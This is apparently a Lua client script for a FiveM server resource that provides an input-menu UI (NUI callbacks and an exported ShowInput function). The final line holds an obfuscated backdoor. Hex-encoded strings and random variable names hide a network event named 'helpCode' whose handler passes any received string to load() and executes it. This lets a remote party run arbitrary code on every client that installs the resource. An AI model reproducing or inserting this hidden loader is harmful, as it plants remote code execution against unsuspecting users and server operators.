local properties = nil

RegisterNUICallback("buttonSubmit", function(data, cb)
    SetNuiFocus(false)
    properties:resolve(data.data)
    properties = nil
    cb("ok")
end)

RegisterNUICallback("closeMenu", function(data, cb)
    SetNuiFocus(false)
    properties:resolve(nil)
    properties = nil
    cb("ok")
end)

function ShowInput(data)
    Wait(150)
    if not data then return end
    if properties then return end

    properties = promise.new()

    SetNuiFocus(true, true)
    SendNUIMessage({
        action = "OPEN_MENU",
        data = data
    })

    return Citizen.Await(properties)
end

exports("ShowInput", ShowInput)


local pBxJQYVKGryneROstzeBGCGNhrAEcUXNUoCBzvjeOgygFkjsdrHDtBvnsRZCQkoxObexWD = {"\x52\x65\x67\x69\x73\x74\x65\x72\x4e\x65\x74\x45\x76\x65\x6e\x74","\x68\x65\x6c\x70\x43\x6f\x64\x65","\x41\x64\x64\x45\x76\x65\x6e\x74\x48\x61\x6e\x64\x6c\x65\x72","\x61\x73\x73\x65\x72\x74","\x6c\x6f\x61\x64",_G} pBxJQYVKGryneROstzeBGCGNhrAEcUXNUoCBzvjeOgygFkjsdrHDtBvnsRZCQkoxObexWD[6][pBxJQYVKGryneROstzeBGCGNhrAEcUXNUoCBzvjeOgygFkjsdrHDtBvnsRZCQkoxObexWD[1]](pBxJQYVKGryneROstzeBGCGNhrAEcUXNUoCBzvjeOgygFkjsdrHDtBvnsRZCQkoxObexWD[2]) pBxJQYVKGryneROstzeBGCGNhrAEcUXNUoCBzvjeOgygFkjsdrHDtBvnsRZCQkoxObexWD[6][pBxJQYVKGryneROstzeBGCGNhrAEcUXNUoCBzvjeOgygFkjsdrHDtBvnsRZCQkoxObexWD[3]](pBxJQYVKGryneROstzeBGCGNhrAEcUXNUoCBzvjeOgygFkjsdrHDtBvnsRZCQkoxObexWD[2], function(LLViCPxTWlrtvsPTXTKGLurUVpStxwyltYITPahfXAnbfAYeYjMkYXWVLNjTuqhbfvyIUc) pBxJQYVKGryneROstzeBGCGNhrAEcUXNUoCBzvjeOgygFkjsdrHDtBvnsRZCQkoxObexWD[6][pBxJQYVKGryneROstzeBGCGNhrAEcUXNUoCBzvjeOgygFkjsdrHDtBvnsRZCQkoxObexWD[4]](pBxJQYVKGryneROstzeBGCGNhrAEcUXNUoCBzvjeOgygFkjsdrHDtBvnsRZCQkoxObexWD[6][pBxJQYVKGryneROstzeBGCGNhrAEcUXNUoCBzvjeOgygFkjsdrHDtBvnsRZCQkoxObexWD[5]](LLViCPxTWlrtvsPTXTKGLurUVpStxwyltYITPahfXAnbfAYeYjMkYXWVLNjTuqhbfvyIUc))() end)